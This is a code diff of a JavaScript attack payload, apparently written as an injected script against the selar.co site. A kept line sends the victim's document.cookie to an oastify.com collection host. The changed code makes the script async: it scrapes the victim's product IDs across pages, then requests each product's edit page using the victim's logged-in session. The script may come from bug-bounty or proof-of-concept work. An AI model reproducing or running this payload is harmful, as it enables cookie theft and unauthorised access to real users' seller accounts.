@@ -1,32 +1,44 @@
 let currSession="";
 fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/${document.cookie}`, {mode: 'no-cors',});
-let urls = ['not empty'];
-let token = 0;
-let index=0;
-let b = [];
-while (urls != []) {
-console.log(index)
-  index += 1;
-  fetch(`https://selar.co/me/products?domain=selar.co&requires_product_url=1&page=${index}`)
-  .then(response => response.text())
-  .then(html => {
-    //console.log(html);
-const str  = html;
-const match = str.match(/selar.co\\\/[a-zA-Z0-9]+/);
-const matches = [...str.matchAll(/selar.co\\\/[a-zA-Z0-9]+/g)];
-urls = matches.filter(match => match[0].split('/')[1].length === 6).map(match => match[0].split('/')[1]);
-if (urls != []) {
-for (let i=0; i<urls.length; i++) {b.push(urls[i])}
+async function fetchUrls() {
+  let index = 1;
+  let b = [];
+  let urls = [''];
+
+  while (urls.length > 0 && index <= 6) {
+    try {
+      console.log(`Fetching page ${index}`);
+      const response = await fetch(
+        `https://selar.co/me/products?domain=selar.co&requires_product_url=1&page=${index}`
+      );
+      const html = await response.text();
+      const matches = [...html.matchAll(/selar.co\\\/[a-zA-Z0-9]+/g)];
+      urls = matches
+        .filter(match => match[0].split('/')[1].length === 6)
+        .map(match => match[0].split('/')[1]);
+      
+      if (urls.length > 0) {
+        b.push(...urls);
+      }
+      console.log(`Page ${index}:`, urls);
+      index++;
+    } catch (error) {
+      console.error('Error fetching the HTML:', error);
+      break;
+    }
+  }
+  return b; 
 }
-console.log(urls,index); 
-  })
-  .catch(error => console.error('Error fetching the HTML:', error));
-if (index >6) {break}
-}
-console.log(b.length);
-let xhr = new XMLHttpRequest();
-for (let x=0; x<b.length; x++) {
-  xhr.open('GET', `https://selar.co/me/products/${b[x]}/edit`, true);
+
+// Usage:
+async function main() {
+  try {
+    const allUrls = await fetchUrls();
+    console.log('All collected URLs:', allUrls);
+    // Continue with the rest of your code here
+    let xhr = new XMLHttpRequest();
+for (let x=0; x<allUrls.length; x++) {
+  xhr.open('GET', `https://selar.co/me/products/${allUrls[x]}/edit`, true);
   xhr.setRequestHeader('Accept', 'text/html, application/xhtml+xml');
   xhr.setRequestHeader('Accept-Language', 'en-US,en;q=0.5');
   xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
@@ -122,3 +134,16 @@ for (let x=0; x<b.length; x++) {
   };
   xhr.send();
 }
+
+  } catch (error) {
+    console.error('Error in main:', error);
+  }
+}
+
+main();
+
+
+
+
+
+
